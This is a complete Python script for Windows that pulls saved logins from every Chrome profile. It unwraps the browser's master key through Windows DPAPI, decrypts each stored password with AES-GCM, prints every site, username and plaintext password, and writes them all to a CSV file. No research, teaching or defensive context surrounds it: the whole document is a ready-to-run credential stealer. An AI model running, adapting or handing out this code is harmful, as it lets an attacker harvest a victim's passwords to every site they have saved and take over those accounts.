import os
import re
import sys
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import csv

# Constants
CHROME_LOCAL_STATE_PATH = os.path.join(os.environ['USERPROFILE'], r"AppData\Local\Google\Chrome\User Data\Local State")
CHROME_LOGIN_DATA_PATH = os.path.join(os.environ['USERPROFILE'], r"AppData\Local\Google\Chrome\User Data")

def retrieve_secret_key():
    try:
        # Open Chrome's local state to retrieve the encrypted key
        with open(CHROME_LOCAL_STATE_PATH, "r", encoding='utf-8') as file:
            local_state_data = json.loads(file.read())
        encrypted_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])[5:]
        decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return decrypted_key
    except Exception as error:
        print(f"[ERROR] Failed to retrieve secret key: {error}")
        return None

def create_cipher_instance(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_chrome_password(ciphertext, secret_key):
    try:
        iv = ciphertext[3:15]  # Extract initialization vector
        encrypted_password = ciphertext[15:-16]  # Extract encrypted password
        cipher = create_cipher_instance(secret_key, iv)
        decrypted_password = cipher.decrypt(encrypted_password).decode()  
        return decrypted_password
    except Exception as error:
        print(f"[ERROR] Decryption failed: {error}")
        return ""

def connect_to_chrome_db(login_data_path):
    try:
        shutil.copy2(login_data_path, "TemporaryLoginData.db") 
        return sqlite3.connect("TemporaryLoginData.db")
    except Exception as error:
        print(f"[ERROR] Unable to access Chrome database: {error}")
        return None

def extract_and_save_passwords():
    try:
        # Setup CSV file to store extracted credentials
        with open('extracted_chrome_passwords.csv', mode='w', newline='', encoding='utf-8') as password_file:
            csv_writer = csv.writer(password_file)
            csv_writer.writerow(["Index", "Website", "Username", "Password"])
            
            # Retrieve the secret key for decryption
            secret_key = retrieve_secret_key()
            if not secret_key:
                print("[ERROR] Secret key retrieval failed. Exiting.")
                return
            
            # Identify Chrome profiles
            profile_folders = [folder for folder in os.listdir(CHROME_LOGIN_DATA_PATH) if re.match(r"^Profile|^Default$", folder)]
            for profile in profile_folders:
                login_data_path = os.path.join(CHROME_LOGIN_DATA_PATH, profile, "Login Data")
                db_connection = connect_to_chrome_db(login_data_path)
                
                if db_connection:
                    cursor = db_connection.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    
                    for idx, entry in enumerate(cursor.fetchall()):
                        site_url, username, encrypted_pass = entry
                        if site_url and username and encrypted_pass:
                            decrypted_pass = decrypt_chrome_password(encrypted_pass, secret_key)
                            print(f"[INFO] Record {idx} | Site: {site_url} | User: {username} | Pass: {decrypted_pass}")
                            csv_writer.writerow([idx, site_url, username, decrypted_pass])
                    
                    # Close and remove the temporary database copy
                    cursor.close()
                    db_connection.close()
                    os.remove("TemporaryLoginData.db")
    except Exception as error:
        print(f"[ERROR] An unexpected error occurred: {error}")

if __name__ == '__main__':
    extract_and_save_passwords()
